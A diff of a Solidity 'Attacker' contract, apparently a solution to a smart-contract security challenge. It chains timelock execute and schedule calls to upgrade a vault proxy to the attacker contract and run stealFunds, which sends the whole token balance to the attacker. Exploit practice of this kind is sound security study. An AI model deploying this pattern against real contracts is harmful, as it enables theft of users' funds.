@@ -26,10 +26,8 @@ contract Attacker is UUPSUpgradeable {
     function buildAttack()
         internal
         view
-        returns (address[] memory, uint256[] memory, bytes[] memory, bytes32)
+        returns (address[] memory, uint256[] memory, bytes[] memory)
     {
-        bytes32 salt = keccak256(abi.encodePacked(block.timestamp, msg.sender));
-
         address[] memory targets = new address[](4);
         uint256[] memory values = new uint256[](4);
         bytes[] memory datas = new bytes[](4);
@@ -50,35 +48,38 @@ contract Attacker is UUPSUpgradeable {
         values[2] = uint256(0);
         datas[2] = abi.encodeWithSignature("scheduleAttack()");
 
-        targets[3] = address(climberVaultProxy);
+        targets[3] = address(climberVaultProxy); // upgrade this contract as new proxy and call steal funds
         values[3] = uint256(0);
-        datas[3] = abi.encodeWithSignature("upgradeTo(address)", address(this));
+        datas[3] = abi.encodeWithSignature(
+            "upgradeToAndCall(address,bytes)",
+            address(this),
+            abi.encodeWithSignature("stealFunds()")
+        );
 
-        return (targets, values, datas, salt);
+        return (targets, values, datas);
     }
 
     function attack() external {
         (
             address[] memory targets,
             uint256[] memory values,
-            bytes[] memory datas,
-            bytes32 salt
+            bytes[] memory datas
         ) = buildAttack();
-        climberTimelock.execute(targets, values, datas, salt);
+        climberTimelock.execute(targets, values, datas, 0);
     }
 
     function stealFunds() external {
-        token.transfer(attacker, token.balanceOf(address(this)));
+        uint256 balance = token.balanceOf(address(this));
+        token.transfer(attacker, balance);
     }
 
     function scheduleAttack() external {
         (
             address[] memory targets,
             uint256[] memory values,
-            bytes[] memory datas,
-            bytes32 salt
+            bytes[] memory datas
         ) = buildAttack();
-        climberTimelock.schedule(targets, values, datas, salt);
+        climberTimelock.schedule(targets, values, datas, 0);
     }
 
     function _authorizeUpgrade(address newImplementation) internal override {}
